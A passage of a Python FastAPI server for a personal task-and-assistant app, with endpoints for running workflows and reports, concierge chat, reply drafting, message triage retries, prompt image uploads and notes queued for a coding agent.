    # A WORKFLOW RUN IS A TASK, not a report landing later (the owner, 2026-10-08: "when you hit run now it should not
    # be like report that runs in background but the task should show up in assistant canvas"): it is made now, its
    # agent starts on its own thread, and the page is handed the task to open. From a phone too - that road ran it as a
    # report, blocking on the agent's first turn, and a workflow with a checkout was filed under Reports (workflows.run).
    # The chat hears the task's ref in the receipt (concierge: "started as TQ-..."), at once - nothing lands later to tell it
    from . import workflows
    if workflows.is_workflow(src) and workflows.definition(store, src)['type'] == 'agent':
        out = workflows.run(store, src, actor=ACTOR, trigger='phone' if asked else by, background=True)
        return {'queued': True, 'sourceId': sid, 'title': title, 'workflow': True, 'task_id': out['task_id'], 'ref': out['ref'],
                'busy': bool(out.get('busy')), 'link': f"#task={out['task_id']}"}
    def work():
        # the one road (reports.run_one): a manual run is extra - it never uses up the report's schedule
        try: out = run_one(store, src, _llm(), trigger='manual')
        except Exception as e:
            logger.warning(f'rerun of report {sid} failed: {e}'); out = {'error': str(e)[:300], 'failed': True}
        # ...left on the report, where the Advisor and the chat read it - a run has no task to carry it (failures.record_on)
        if out.get('failed') or out.get('error'):
            try: failures.record_on(store, 'source', sid, kind='report.run', error=out.get('error') or 'the run failed', what=f'{title} did not run', name=title)
            except Exception as e: logger.debug(f'the failed run of report {sid} was not recorded: {e}')
        if asked:
            from . import remote_assistant
            said = str(out.get('summary') or out.get('said') or out.get('error') or out.get('subject') or 'done').strip()
            failed = bool(out.get('failed') or out.get('error'))
            text = (f"{title} {'could not run' if failed else 'is already running' if out.get('busy') else 'landed'}: {said[:900]}"
                    + (f"\n\nIt is in the pipe. Say \"read {title}\" for the whole thing." if out.get('message_id') else ''))
            try: remote_assistant.send(store, asked['channel'], asked['chat'], text, asked.get('connector_id'))
            except Exception as e: logger.warning(f'the landed report could not reach {asked.get("channel")}: {e}')
    # queued, not awaited: the report lands on the Timeline like a scheduled run, and the pipe picks it up
    _spawn_rerun(work)
    try: cfg = json.loads(src.get('ConfigJson') or '{}') or {}
    except ValueError: cfg = {}
    from .reports import run_lands
    return {'queued': True, 'sourceId': sid, 'title': cfg.get('title') or src.get('Address'), 'lands': run_lands(cfg)}

@app.post('/api/concierge/say')
def concierge_say(body: ConciergeSayBody):
    from . import concierge
    try:
        # A TYPED TURN POLLS NOTHING. The freshness check belongs where the item is LOADED into the
        # chat - surfaced or pulled - and that is where it still runs. Doing it again on every prompt
        # re-triaged the same item it had just checked, and announced it: asking "can you remove all
        # the reports in the funnel?" answered "New message from Process Error Check arrived... I sent
        # it through triage before continuing" (the owner, 2026-09-07: "that is the retriage, not a
        # actual triage of the same item again? what's the point of that").
        #
        # Nothing is lost. The act boundary guards itself: operations.propose pins ContextRevision and
        # execute refuses a moved one (409), and verdicts.decide re-checks before a reply can leave.
        return concierge.say(store, body.text, body.key, actor=ACTOR, open_card=body.open_card, images=prompt_images(body.images))
    except ValueError as e: raise HTTPException(422, str(e))

@app.get('/api/concierge/chips')
def concierge_chips(key: str):
    """The action words one item carries - chips_for, read only. The Assistant Game offers an item the same
    words the chat would put under it, gated the same way (cannot()), without surfacing it: asking what you
    COULD do with a thing is not reading it, so nothing is marked and the walk does not move."""
    from . import concierge, funnel
    item = funnel.next_item(store, key, include_surfaced=True) or funnel.item_for_key(store, key)
    if not item: raise HTTPException(404, 'that one is not in the pipe any more')
    return {'key': key, 'chips': concierge.chips_for(store, item)}

@app.get('/api/advice')
def advice_for(key: str):
    """The Advisor's one decision for the item on the table, at its current revision (advisor.decide): the verb it lights and the line it
    says ('' is silent) - the same for the canvas, the Tasks tab and the phone - or {"none": why} where nothing is lit."""
    from . import advisor
    return advisor.status(store, key)


class AdvicePressBody(BaseModel):
    key: str; pressed: str; advised: str | None = None; revision: str | None = None
    surface: str = 'desk'; lit: str | None = None; live: list[str] | None = None

@app.post('/api/advice/press')
def advice_press(body: AdvicePressBody):
    """EVERY PRESS on the desk's row or card and on the Tasks tab, lit or not (phase B, 2026-10-23): the surface, what it had lit, what
    else was live, what was pressed (advisor.press; the phone records in-process). Never fails the press it rides on - a lost row
    costs one observation."""
    from . import advisor
    try: return {'id': advisor.press(store, body.key, body.advised, body.pressed, body.revision, surface=body.surface, lit=body.lit,
                                     live=body.live)}
    except Exception as e: logger.warning(f'advice press on {body.key} not recorded: {e}'); return {'id': 0}


@app.get('/api/advice/notes')
def advice_notes(key: str, limit: int = 10):
    """The Advisor's notes on an item: what it looked at, decided and dropped, per revision (advisor.notes)."""
    from . import advisor
    return {'rows': advisor.notes(store, key, limit)}


class ConciergeProposeBody(BaseModel):
    verb: str; key: str; text: str | None = None; table: bool = False; exact: bool = False; revision: str | None = None
    # A BUTTON PRESSED ON THE DESK (concierge.propose_direct `press`): it runs at once, with no line in the owner's name and no card to confirm
    press: bool = False
    # THE AGENT BOX'S ANSWERS (RunForm.AgentAsk): which profile, brain and model a hand-off runs on - the words ride in `text`
    agent: str | None = None; brain: str | None = None; pick: str | None = None; model: str | None = None

@app.post('/api/concierge/propose')
def concierge_propose(body: ConciergeProposeBody):
    """A card's own button on one entry: the same proposal the words would make (PW-151), confirmed the same way."""
    from . import concierge
    if body.revision:                                   # the Advisor's pill carries the stamp it was judged at: a moved item refuses it
        from . import advisor
        tgt = advisor.target_of(store, body.key)
        if tgt and advisor.revision(store, *tgt) != body.revision:
            raise HTTPException(409, 'That one changed since the Advisor looked at it - read it again before pressing.')
    picks = {'agent': body.agent, 'brain': body.brain, 'pick': body.pick, 'model': body.model}
    try: return concierge.propose_direct(store, body.verb, body.key, body.text or '', ACTOR, table=body.table, exact=body.exact, picks=picks, press=body.press)
    except ValueError as e: raise HTTPException(422, str(e))

class SetupBody2(BaseModel): text: str

@app.post('/api/concierge/setup')
def concierge_setup(body: SetupBody2, background: BackgroundTasks):
    """'Set up X': a walk-through task with the owner's words, and the walk STARTS."""
    from . import concierge, general
    try: made = concierge.setup_task(store, body.text, ACTOR)
    except ValueError as e: raise HTTPException(422, str(e))
    # marked HERE, not in the background task: the pane loads its snapshot within a second of this
    # response and has to be told that a session is coming, or it stops looking for one
    general.OPENING.add(made['taskId'])
    background.add_task(_walk_opens, made['taskId'], body.text)
    return made


# What the walk is told to do first. It is an instruction, never the owner's words -
# their ask is already the one human comment on the task, and repeating it back as a second user
# turn is the conversation talking to itself.
WALK_OPENING = (
    "The owner just asked for this in the Assistant chat and is watching this conversation right "
    "now. Begin the walk. Do not restate their ask and do not ask them to confirm they want it. "
    "First line: whether this can be done from here, and name any part that cannot. Then take them "
    "through the FIRST step only - the actual screen, sign-in or setting - and ask the single thing "
    "you need from them to take it. One step per turn, then stop and wait.")


def _walk_opens(task_id: int, text: str):
    """A set-up walk-through actually starts, right after the response, so the chat is already
    bound to it on screen. It used to open a task and say "open it when you want to start", which
    left the owner holding a cold row and doing the walking themselves (the owner, 2026-09-10:
    "it's supposed to walk me through this?").

    Never raises. A walk that could not start costs a sentence, and the task is still there to be
    opened by hand - which is exactly where this stood before."""
    from . import concierge, general
    try:
        if general.session_for(task_id): return          # already in conversation - not ours to interrupt
        if not general.provider_options(store):
            # a session with no brain parks forever, looking live
            logger.info(f'no AI connector, so the walk-through {task_ref(task_id)} cannot start')
            _walk_cannot(task_id, 'No AI is connected yet, so I cannot start the walk. Connect one under '
                                  f"{words.name('ai')} and ask me again.")
            return
        try:
            if concierge.walk_is_external(store, text): store.tag_task(task_id, general.SETUP_EXTERNAL, actor=ACTOR)
            general.start_session(store, task_id, actor=ACTOR).send_prompt(WALK_OPENING, as_owner=False, echo=False)
        except Exception as e:
            general.drop_session(task_id)                # and never leave half a session behind
            logger.info(f'the walk-through {task_ref(task_id)} could not start: {str(e)[:200]}')
            # ...and it says so in the conversation. Logged only, a walk that died on its first
            # breath is indistinguishable from one still thinking: an empty pane either way.
            _walk_cannot(task_id, f'The walk could not start: {str(e)[:200]}')
    finally:
        general.OPENING.discard(task_id)


def _walk_cannot(task_id: int, why: str):
    from . import general
    try: store.add_comment(task_id, 'assistant', general.ASSISTANT_TYPE, why)
    except Exception as e: logger.debug(f'the walk {task_ref(task_id)} could not report its own failure - {e}')

@app.post('/api/concierge/act')
def concierge_act(body: ConciergeActBody):
    from . import concierge
    try: return concierge.act(store, body.key, body.verb, ACTOR, _llm(), body.hours)
    except ValueError as e: raise HTTPException(422, str(e))

# ── the waiting room: notes for a working agent, delivered when it stops (waitroom.py) ──
@app.get('/api/tasks/{tid}/waitroom')
def waitroom_list(tid: int):
    if not store.get_task(tid): raise HTTPException(404, 'task not found')
    return {'data': store.waitroom(tid), 'state': waitroom.state(store, tid)[0]}

@app.post('/api/tasks/{tid}/waitroom')
def waitroom_add(tid: int, body: dict):
    """Queue a note for this task's agent. It is typed in the moment the agent parks at its
    prompt - and at once, as the answer, when it is already parked on a question for you."""
    try: return waitroom.add(store, tid, str((body or {}).get('text') or ''), ACTOR)
    except ValueError as e: raise HTTPException(422, str(e))

@app.post('/api/tasks/{tid}/waitroom/bulk')
def waitroom_bulk(tid: int, body: dict):
    """A pasted list - one prompt per line - becomes that many notes, in order. With the drip on
    (Settings -> Coding agent) each lands as its own turn when the agent stops."""
    try: return waitroom.add_many(store, tid, str((body or {}).get('text') or ''), ACTOR)
    except ValueError as e: raise HTTPException(422, str(e))

_IMG_EXT = {'image/png': 'png', 'image/jpeg': 'jpg', 'image/gif': 'gif', 'image/webp': 'webp'}
IMG_MAX = 12 * 1024 * 1024

@app.post('/api/tasks/{tid}/waitroom/image')
async def waitroom_image(tid: int, request: Request):
    """A screenshot pasted into the Tell-the-agent box, posted as the raw body (no multipart
    dependency, like /api/voice/transcribe). The pty carries text only, so the image goes to
    disk under ~/.taskuary/attachments/waitroom/<task>/ and the NOTE names the file - a coding
    CLI reads images from a path (Claude Code's Read does), which is how it gets to see it."""
    return await _save_prompt_image(tid, request)


@app.post('/api/prompt-image')
async def prompt_image(request: Request):
    """An image for a prompt that has no task yet - the New box, the chat line, Continue (the owner, 2026-09-30: "can't attach
    images ... to write this prompt?"). Same bytes-as-body contract as the waitroom; the prompt names the path it returns."""
    return await _save_prompt_image(None, request)


def prompt_images(paths) -> list[str]:
    """The paths a prompt may name: only files this server saved under attachments/ - a path from the page is never a read of
    anything else on the disk."""
    root, out = (config.home() / 'attachments').resolve(), []
    for raw in (paths or [])[:8]:
        try:
            p = Path(str(raw)).resolve()
            if p.is_file() and p.is_relative_to(root): out.append(str(p))
        except (OSError, ValueError): continue
    return out


def with_images(text: str, paths) -> str:
    """The words, then the files - how a CLI agent is shown a picture: it reads the path (general.py says it the same way)."""
    ps = prompt_images(paths)
    return (text or '') + ('\n\nATTACHED IMAGES (read these files)\n' + '\n'.join(ps) if ps else '')


async def _save_prompt_image(tid: int | None, request: Request):
    """Store an image that will be named in a CLI prompt, from any prompt surface. The store and the disk off the loop."""
    if tid is not None and not await run_in_threadpool(store.get_task, tid): raise HTTPException(404, 'task not found')
    mime = (request.headers.get('content-type') or '').split(';')[0].strip().lower()
    ext = _IMG_EXT.get(mime)
    if not ext: raise HTTPException(415, 'paste a PNG, JPEG, GIF or WebP image')
    data = await request.body()
    if not data: raise HTTPException(422, 'no image in the request')
    if len(data) > IMG_MAX: raise HTTPException(413, 'image over 12 MB - crop it')
    d = config.home() / 'attachments' / ('waitroom' if tid is not None else 'prompt') / (str(tid) if tid is not None else time.strftime('%Y%m'))
    d.mkdir(parents=True, exist_ok=True)
    p = d / f'{time.strftime("%Y%m%d-%H%M%S")}-{secrets.token_hex(3)}.{ext}'
    def keep():
        p.write_bytes(data)
        if tid is not None: store.audit('task', tid, 'waitroom_image', ACTOR, detail={'path': str(p), 'size': len(data)})
    await run_in_threadpool(keep)
    return {'path': str(p), 'size': len(data)}


@app.post('/api/terminals/{sid}/image')
async def terminal_image(sid: str, request: Request):
    """Paste a screenshot into xterm's prompt: save it and return the local path to type."""
    t = hub_term.get(sid)
    if not t: raise HTTPException(404, 'terminal not found')
    if not t.task_id: raise HTTPException(422, 'this terminal is not attached to a task')
    return await _save_prompt_image(t.task_id, request)

@app.delete('/api/tasks/{tid}/waitroom/{wid}')
def waitroom_drop(tid: int, wid: int):
    store.drop_waiting(wid, tid)
    return {'ok': True}

@app.post('/api/reviews/{rid}/reopen')
def reopen_review(rid: int):
    """A draft closed without sending, back in front of you to send after all (T11, the owner, 2026-09-25: "keep draft
    reply even if closed so you can send later if you want"). Mark done kept it on the task; nothing could send it."""
    rv = store.get_review(rid)
    if not rv: raise HTTPException(404, 'review not found')
    if rv.get('Kind') == 'action': raise HTTPException(422, 'a proposal is proposed again, not reopened')
    if rv['Status'] not in ('closed_unsent', 'no_reply', 'rejected'): raise HTTPException(422, f"this one is {rv['Status']}, not closed")
    if not str(rv.get('DraftText') or '').strip(): raise HTTPException(422, 'there is no draft to send')
    store.unhold_review(rid, 'brought back by you to send after all')
    store.audit('review', rid, 'reopen', ACTOR)
    return {'ok': True}

@app.post('/api/reviews/{rid}/release')
def release_review(rid: int):
    """Answer now without waiting for the session. A held draft is one the agent's findings are
    supposed to rewrite - but sometimes the sender just needs telling something today, and a
    reply held behind an agent that never finished is worse than an early one."""
    rv = store.get_review(rid)
    if not rv: raise HTTPException(404, 'review not found')
    if rv['Status'] != 'held': raise HTTPException(422, 'this one is not being held')
    store.unhold_review(rid, 'released by you - answered without waiting for the session')
    store.audit('review', rid, 'release', ACTOR)
    return {'ok': True}

class DraftBody(BaseModel): instruction: str | None = None     # a reply opened at once with the owner's words (open_reply's later)

@app.post('/api/reviews/{rid}/draft')
def draft_review(rid: int, body: DraftBody = None):
    """(Re)generate the AI draft for a pending review inline. The main AI writes replies -
    a coding CLI is the wrong (and expensive) tool for two sentences of email - unless the
    owner deliberately configured an agent named `responder`. On a review a coding agent closed,
    the redraft reads its report, so it reports the work instead of promising it."""
    rv = store.get_review(rid)
    if not rv: raise HTTPException(404, 'review not found')
    # one of the task's emails (slots.py) is the agent's words: every redrafter here writes a reply to the sender
    try: deliver = json.loads(rv.get('Deliver') or '{}') or {}
    except (TypeError, ValueError): deliver = {}
    # ...unless the owner started it from the task (outbox.task_email): it keeps their brief, and is written from it again
    if rv.get('Kind') == 'slot' and deliver.get('by') != 'owner': raise HTTPException(422, 'the agent writes this email - ask it again, or edit it here')
    # a calendar answer's note is the owner's one line: no redrafter writes an RSVP (calwrite.py)
    if deliver.get('kind') == 'calendar': raise HTTPException(422, 'the note on a calendar answer is yours to write - or leave it empty')
    # THE OWNER'S WORDS FOR IT ARE KEPT on the review (the owner, 2026-10-23: a Redraft's instruction is stored and remembered)
    if body and (body.instruction or '').strip(): _keep_instruction(rid, body.instruction)
    try:
        if rv.get('Kind') == 'slot':
            from . import outbox as ob
            chat = (deliver.get('channel') or 'email') != 'email'
            draft = ob.draft_message(store, deliver.get('channel') or 'email', [deliver['name']] if chat and deliver.get('name') else deliver.get('to'), ob.results_brief('\n\n'.join(filter(None, [deliver.get('about'), _reply_nudge(body and body.instruction)]))),
                                     resolution=ob.work_of(store, rv['TaskId']) or None, cc=deliver.get('cc'),
                                     attached=None if chat else [f.get('name') for f in deliver.get('attachments') or []],
                                     mailbox=None if chat else outbound.sending_mailbox(store, rv))
            store.update_review_draft(rid, draft, rv.get('RunId'))
        elif deliver.get('channel') and deliver.get('kind') != 'zoho_invoice':
            from . import outbox as ob
            draft = ob.redraft_review(store, rv, instruction=_reply_nudge(body and body.instruction))
        elif rv.get('TaskId'):
            _refresh_chat_context(task_id=rv.get('TaskId'), message_id=rv.get('MessageId'))
            draft = responder.write_draft(store, rv['TaskId'], rid, actor=ACTOR, nudge=_reply_nudge(body and body.instruction))
        else:
            message = store.get_message(rv.get('MessageId'))
            if not message: raise RuntimeError('the message behind this reply no longer exists')
            _refresh_chat_context(message_id=message['MessageId'])
            message = _latest_context_message(None, message['MessageId']) or message
            draft = responder.draft_for_message(store, message, rid, instruction=_reply_nudge(body and body.instruction))
    except Exception as e:
        store.set_review_draft_error(rid, str(e)[:300])     # visible beside the draft box, with Retry (PW-046)
        raise HTTPException(422, str(e)[:300])
    store.audit('review', rid, 'redraft', ACTOR)
    return {'ok': True, 'draft': draft}

class EnvelopeBody(BaseModel): mode: str | None = None; to: list[str] | None = None; cc: list[str] | None = None

@app.put('/api/reviews/{rid}/envelope')
def set_review_envelope(rid: int, body: EnvelopeBody):
    """Reply all / Reply to, and editable To/CC, kept with the draft so approval sends exactly this (PW-063/064)."""
    rv = store.get_review(rid)
    if not rv: raise HTTPException(404, 'review not found')
    if rv.get('Status') not in ('pending', 'held'): raise HTTPException(409, 'this reply has already been decided')
    # one of the TASK's emails (slots.py) has no message to answer: its recipient is the slot's own, corrected here
    if rv.get('Kind') == 'slot':
        if body.to is None: raise HTTPException(422, 'give the address this email goes to')
        from . import slots
        try: env = slots.readdress(store, rv, body.to, ACTOR)
        except ValueError as e: raise HTTPException(422, str(e))
        store.audit('review', rid, 'envelope', ACTOR, detail={'to': env['to']})
        return env
    m = store.get_message(rv.get('MessageId')) if rv.get('MessageId') else None
    if not m or str(m.get('Channel') or '').lower() != 'email': raise HTTPException(422, 'only an email reply has a recipient envelope')
    env = store.review_envelope(rid) or outbound.reply_envelope(store, m) or {}
    if body.mode: env = outbound.reply_envelope(store, m, mode=body.mode) or env
    # ..."Erin Blake <erin@…>" is the address in it: the To line wears the name, and saved back whole it was kept as the address
    from email.utils import parseaddr
    def clean(seq):
        out = []
        for a in seq or []:
            a = (parseaddr(str(a or ''))[1] or str(a or '')).strip().lower()
            if a and '@' in a and a not in out: out.append(a)
        return out
    if body.to is not None: env['to'] = clean(body.to)
    if body.cc is not None: env['cc'] = [a for a in clean(body.cc) if a not in env.get('to', [])]
    if not env.get('to'): raise HTTPException(422, 'a reply needs at least one recipient')
    store.set_review_envelope(rid, env)
    store.audit('review', rid, 'envelope', ACTOR, detail={'mode': env.get('mode'), 'to': env.get('to'), 'cc': env.get('cc')})
    return env

@app.patch('/api/reviews/{rid}')
def save_review_text(rid: int, body: TextBody):
    """Save what is in the reply box without deciding or sending it - with the owner's signature applied once
    on an email draft (PW-065); an edit that already carries it is kept as written."""
    rv = store.get_review(rid)
    if not rv: raise HTTPException(404, 'review not found')
    if rv.get('Status') not in ('pending', 'held'):
        raise HTTPException(409, 'this reply has already been decided')
    text = str(body.body or '')[:50_000]
    m = store.get_message(rv.get('MessageId')) if rv.get('MessageId') else None
    if m and str(m.get('Channel') or '').lower() == 'email' and text.strip():
        text = responder.with_signature(text, responder.signature_for(store, outbound.sending_mailbox(store, rv, m)))
    store.save_review_draft(rid, text)
    store.audit('review', rid, 'edit_draft', ACTOR, detail={'characters': len(text)})
    return {'ok': True, 'draft': text}

def _llm(target_store=None):
    target_store = target_store or store
    try:
        from .llm import build_llm
        return build_llm(target_store, job='triage')
    except Exception:
        return None

@app.post('/api/ingest/push')
def push(body: MsgBody):
    m = body.model_dump()
    m['external_id'] = m.get('external_id') or f'api:{datetime.now().isoformat()}'
    m['sent_at'] = m.get('sent_at') or datetime.now().isoformat(sep=' ', timespec='seconds')
    out = ingest_message(store, m, llm=_llm())
    return {**out, 'ref': task_ref(out['task_id']) if out.get('task_id') else None}

@app.post('/api/messages/retriage-failed')
def retriage_failed():
    """RETRY ALL: every message whose triage failed, oldest first, whatever its age and however often it was tried. The
    automatic sweep reaches one day back and four tries, so a brain that failed on every call for a day (the ChatGPT-plan
    stream read as bytes) left that day as "AI triage failed" for good, and only one row at a time could be retried (the
    owner, 2026-10-06: "i refreshed the app but it did not retriage??"). Off the request - a day of mail is minutes of
    calls - and it stops at the first failure, as the sweep does, so a brain still down costs one call."""
    brain = _llm()
    if not brain: raise HTTPException(422, 'no triage AI is available - check Connections and Settings')
    n = len(store.stranded_triage_failures(500))
    from . import ingest as ingest_mod
    if n: threading.Thread(target=ingest_mod.retry_failed_triage, args=(store, brain), kwargs={'limit': 500, 'hours': 0, 'tries': 0},
                           daemon=True, name='retriage-all').start()
    return {'count': n}


@app.post('/api/messages/{mid}/retriage')
def retriage_message(mid: int):
    """Run a safely-filed triage failure through the current brain again.

    It reuses the stored message row, so no connector fetch and no duplicate message are involved.
    claim_retriage is the compare-and-set that prevents a double click creating two tasks.
    """
    m = store.get_message(mid)
    if not m: raise HTTPException(404, 'message not found')
    # the error state is retriable whether or not the failed follow-up is linked to a task; a
    # legacy failure still stored as a taskless filed row is recognised by its diagnostic
    if m.get('Status') != 'error':
        if m.get('TaskId') is not None:
            raise HTTPException(409, 'this message already belongs to a task')
        routes = store.message_routes(mid)
        last = routes[-1] if routes else {}
        if not re.search(r'\btriage\b.*(?:failed|could not read)', str(last.get('Reason') or ''), re.I):
            raise HTTPException(409, 'retry is only available after triage failed')
    brain = _llm()
    if not brain:
        raise HTTPException(422, 'no triage AI is available - check Connections and Settings')
    if not store.claim_retriage(mid):
        raise HTTPException(409, 'triage is already retrying this message')
    from . import ingest as ingest_mod
    try:
        out = ingest_message(store, {**ingest_mod._from_row(m, store), '_mid': mid},
                             actor=ACTOR, llm=brain)
    except Exception as e:
        # Most AI failures are deliberately recorded as errors by ingest_message. This catches only
        # an unexpected pipeline failure so Retry never leaves the row spinning forever.
        now = store.get_message(mid) or {}
        store.place_message(mid, now.get('TaskId'), 'error')
        store.add_route(mid, now.get('TaskId'), 'file', None,
                        f'triage retry failed ({str(e)[:200]}) - unclassified; retry available', [], 'triage',
                        parse_error=str(e)[:1000])
        raise HTTPException(422, str(e)[:300])
    return {**out, 'ref': task_ref(out['task_id']) if out.get('task_id') else None}

@app.get('/api/sources')
def sources():
    # default_repo rides along so the Board's repo picker preselects it; a report carries its route in
    # the server's own words, so the page never re-derives the rules (reports.route_words)
    from .reports import route_words
    rows = store.list_sources(active_only=False)
    for r in rows:
        if r.get('Channel') != 'report': continue
        try: r['RouteWords'] = route_words(json.loads(r.get('ConfigJson') or '{}'))
        except ValueError: pass
    return {'data': rows, 'default_repo': (cfg.get('github') or {}).get('default_repo')}

@app.post('/api/sources')
def save_source(body: SourceBody):
    fields = {k: (int(v) if k == 'Active' else v) for k, v in body.model_dump().items() if v is not None}
    # Owner is PROVENANCE - who or what put this row here - and only a CREATE sets it. It was set
    # on every save, and `Owner` is in SOURCE_COLS, so an ordinary Reports-tab save (and the on/off
    # toggle, which posts {SourceId, Active}) silently took the row over: a Telegram chat lost the
    # "discovered: <title>" name ConnectorsView prints, and a seeded row stopped being seeded -
    # which moved the app's own Assistant off its Timeline thread and re-namespaced its ideas
    # (assistant.seeded_source). Editing a row has never been a reason to reassign it.
    if not fields.get('SourceId'): fields.setdefault('Owner', ACTOR)
    # A paired WhatsApp account sees everything its owner does - forty groups and every DM - so
    # there is no catch-all for it; each chat is listed or it does not come in (the owner,
    # 2026-09-17). Telegram keeps its '*': a bot only hears the chats it was added to.
    #
    # Read it off the EXISTING row when the body does not say. The toggle sends {SourceId, Active}
    # and nothing else, so a guard that only read the body let an old '*' be switched back on - a
    # switch that says "on" over a source the poller ignores is worse than the source was.
    was = store.get_source(fields['SourceId']) if fields.get('SourceId') else None
    from .messengers import WA_ALL
    channel = str(fields.get('Channel') or (was or {}).get('Channel') or '')
    address = str(fields.get('Address') or (was or {}).get('Address') or '')
    if channel == 'whatsapp' and address == WA_ALL:
        raise HTTPException(422, 'WhatsApp takes named chats only - add the person or the group you want, '
                                 'not every chat on the account')
    was = store.get_source(fields['SourceId']) if fields.get('SourceId') else None
    # a workflow's steps are checked before they are kept: a broken list would only fail on its first scheduled run (flow.validate)
    if fields.get('ConfigJson') and channel == 'report':
        try: rcfg = json.loads(fields['ConfigJson']) or {}; flow_cfg = rcfg.get('flow')
        except (ValueError, AttributeError): rcfg, flow_cfg = {}, None
        # a clock the scheduler cannot read is refused, never saved as "scheduled" (reports.schedule_error, B3)
        from .reports import schedule_error
        if isinstance(rcfg, dict) and (why := schedule_error(rcfg)): raise HTTPException(422, f'Not saved: {why}.')
        # ...and a dashboard's spec, the same check its composer ran: a component bound to no source never draws (dashboards.validate)
        if isinstance(rcfg, dict) and rcfg.get('type') == 'dashboard':
            from . import dashboards
            ok, why = dashboards.validate(rcfg, store)
            if not ok: raise HTTPException(422, f'Not saved: {why}.')
        if flow_cfg is not None:
            from . import flow
            ok, why = flow.validate(store, flow_cfg)
            if not ok: raise HTTPException(422, f'The steps cannot be saved yet: {why}.')
    sid = store.save_source(fields, ACTOR)
    # A NEW WORKFLOW STARTS ON ITS NEXT SLOT, not on the next tick. A source never run is due at once (reports.is_due) - right
    # for a report you want to see, wrong for a job that opens tasks and drafts mail: a weekly Monday workflow saved on a
    # Wednesday ran seconds later, beside the editor's "Saved - runs Mon at 08:00", and again beside its own Save & run now -
    # two laptop tasks, two approvals (walk 2026-10-21). Run now is the door for running it now.
    if not was and channel == 'report':
        from . import workflows
        if workflows.is_workflow(store.get_source(sid)): store.touch_source(sid)
    # SWITCHING SOMETHING ON MUST LOOK BACK. The watermark advances on every poll, including
    # polls that deliberately read nothing from this source (a repo whose issues were 'off',
    # a chat not yet approved) - so flipping it on would otherwise only ever catch what
    # happens NEXT, and everything already sitting there would be invisible forever.
    if was and _woke_up(was, store.get_source(sid)):
        store.rewind_source(sid)
        store.audit('source', sid, 'rewind', ACTOR, detail={'why': 'switched on - the next poll reaches back'})
    from .docsync import sync_connections
    sync_connections(store, ACTOR)
    return {'sourceId': sid}


def _live(src) -> set:
    """What this source is actually set to READ right now: the Active flag plus whichever
    per-kind pickers it carries (github issues/prs, a cloud object's mode)."""
    try: cfg = json.loads(src.get('ConfigJson') or '{}')
    except ValueError: cfg = {}
    if not src.get('Active'): return set()
    return {f'{k}:{cfg[k]}' for k in ('issues', 'prs', 'mode')
            if cfg.get(k) in ('tasks', 'feed', 'replies')} or ({'active'} if not cfg else set())


def _woke_up(before, after) -> bool:
    """Did this save turn something ON that was off? (Never the reverse - switching a repo
    off must not rewind anything.)"""
    return bool(_live(after) - _live(before))

@app.delete('/api/sources/{sid}')
def delete_source(sid: int):
    if not store.get_source(sid): raise HTTPException(404, 'source not found')
    from . import recentlydeleted
    out = recentlydeleted.remove_source(store, sid)          # at once, and kept: the page's Undo, and Recently deleted for a report
    store.audit('source', sid, 'delete', ACTOR)
    from .docsync import sync_connections
    sync_connections(store, ACTOR)
    return {'ok': True, **out}

# ── RECENTLY DELETED (recentlydeleted.py): a Remove acts at once; its Undo line and this list bring it back ──
@app.get('/api/deleted')
def deleted_list(kinds: str = ''):
    from . import recentlydeleted
    want = tuple(k for k in kinds.split(',') if k) or recentlydeleted.LISTED
    return {'data': recentlydeleted.listing(store, want), 'keep_days': recentlydeleted.KEEP_DAYS}

@app.post('/api/deleted/{did}/restore')
def deleted_restore(did: int):
    """Undo and Restore alike: what the Remove took, put back as it was."""
    from . import recentlydeleted
    try: out = recentlydeleted.restore(store, cfg, did)
    except recentlydeleted.Gone as e: raise HTTPException(404, str(e))
    except recentlydeleted.Taken as e: raise HTTPException(409, str(e))
    store.audit('deleted', did, 'restored', ACTOR, detail=out)
    from .docsync import sync_connections
    sync_connections(store, ACTOR)
    return {'ok': True, **out}

@app.get('/api/reports/last-runs')
def report_last_runs():
    """What each report's last run did - when, how long, what it read, what came out (reports.last_runs)."""
    from .reports import last_runs
    return {'data': last_runs(store)}

@app.get('/api/reports/{sid}/runs')
def report_runs(sid: int, limit: int = 60):
    """A report's run history, newest first, without the inputs (store.report_runs) - the Reports tab's
    History; one run whole, inputs and all, is /api/reports/runs/{rid}."""
    if not store.get_source(sid): raise HTTPException(404, 'source not found')
    return {'data': store.report_runs(sid, min(max(1, limit), 200))}

@app.get('/api/reports/{sid}/invoice-batches')
def invoice_batches(sid: int):
    src = store.get_source(sid)
    if not src: raise HTTPException(404, 'report not found')
    return {'data': store.list_invoice_batches(sid)}

@app.post('/api/reports/{sid}/invoice-batches')
def open_invoice_batch(sid: int, body: dict = None):
    from . import invoice_workflow
    src = store.get_source(sid)
    if not src: raise HTTPException(404, 'report not found')
    try: return invoice_workflow.open_batch(store, src, (body or {}).get('period'))
    except Exception as e: raise HTTPException(422, str(e)[:500])

@app.get('/api/invoice-batches/{bid}')
def invoice_batch(bid: int):
    from . import invoice_workflow
    out = invoice_workflow.detail(store, bid)
    if not out: raise HTTPException(404, 'invoice batch not found')
    return out

@app.patch('/api/invoice-batches/{bid}/items/{iid}')
def update_invoice_item(bid: int, iid: int, body: dict):
    from . import invoice_workflow
    try: return invoice_workflow.update_amount(store, bid, iid, body or {})
    except KeyError as e: raise HTTPException(404, str(e))
    except Exception as e: raise HTTPException(422, str(e)[:500])

@app.post('/api/invoice-batches/{bid}/prepare')
def prepare_invoice_batch(bid: int):
    from . import invoice_workflow
    try: return invoice_workflow.prepare(store, bid)
    except KeyError as e: raise HTTPException(404, str(e))
    except Exception as e: raise HTTPException(422, str(e)[:500])

@app.post('/api/reports/{sid}/replay')
def report_replay(sid: int, body: dict = None, limit: int = 5):
    """What the card's routing WOULD have done to the runs already in the history.

    A rule you have never seen fire is a rule you cannot trust, and waiting for tomorrow's run to
    find out the AI reads your sentence differently is not a way to set one up (2026-09-17). Same
    judge, same prompt, on results that already happened - nothing is posted, sent or filed.
    """
    from .reports import asks_ai, decide, judge_for, judge_prompt, read_result, report_llm, with_judge
    if not store.get_source(sid): raise HTTPException(404, 'report not found')
    cfg = body or {}
    llm = report_llm(store, cfg, _llm()) if asks_ai(cfg) else None
    # resolved once for the whole replay: which judge answers is an install-wide setting, and this
    # is the road the two of them are compared on
    chosen = with_judge(judge_for(store, cfg, llm), llm)
    out = []
    for r in store.report_runs(sid, min(max(1, limit), 20)):
        whole = store.get_report_run(r['runId']) or r
        text = str(whole.get('summary') or '') or '\n'.join(str((l or {}).get('text') or '') for l in (whole.get('lines') or []))
